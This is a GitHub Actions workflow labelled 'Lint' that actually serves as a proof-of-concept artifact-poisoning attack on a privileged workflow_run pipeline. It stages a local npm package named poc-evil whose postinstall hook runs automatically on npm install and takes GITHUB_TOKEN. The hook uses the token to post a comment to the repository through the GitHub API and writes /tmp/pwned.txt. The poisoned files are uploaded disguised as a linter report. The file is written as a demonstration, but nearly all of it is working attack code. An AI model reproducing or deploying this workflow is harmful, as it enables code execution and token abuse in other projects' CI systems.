---
name: Lint
on:
  pull_request:

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Stage attacker-controlled artifact payload
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: |
          echo "$PR_NUMBER" > pr-number.txt
          printf 'line one\n' > linter-report.txt
          printf 'allow-scripts=poc-evil\n' > .npmrc
          mkdir -p poc-evil
          cat > package.json <<'JSON'
          {"name":"poc-root","version":"1.0.0","private":true,"dependencies":{"poc-evil":"file:./poc-evil"}}
          JSON
          cat > poc-evil/package.json <<'JSON'
          {"name":"poc-evil","version":"1.0.0","scripts":{"postinstall":"node hook.js"}}
          JSON
          cat > poc-evil/hook.js <<'JSEOF'
const cp = require('child_process');
const token = process.env.GITHUB_TOKEN || '';
const repo = process.env.GITHUB_REPOSITORY || '';
const body = JSON.stringify({body: '**POC-RCE**: npm postinstall executed during `npm install` in the privileged workflow_run context. token_present=' + !!token});
let status = 'none';
try {
  status = cp.execFileSync('curl', ['-s','-o','/dev/null','-w','%{http_code}','-X','POST',
    '-H','Authorization: Bearer ' + token,
    '-H','Content-Type: application/json',
    '-d', body,
    'https://api.github.com/repos/' + repo + '/issues/4/comments'], {encoding: 'utf8'});
} catch (e) { status = 'ERR ' + e.message; }
require('fs').writeFileSync('/tmp/pwned.txt', 'RAN token=' + !!token + ' status=' + status);
JSEOF
      - name: Upload linter report
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          include-hidden-files: true
          path: |
            pr-number.txt
            linter-report.txt
            .npmrc
            package.json
            poc-evil
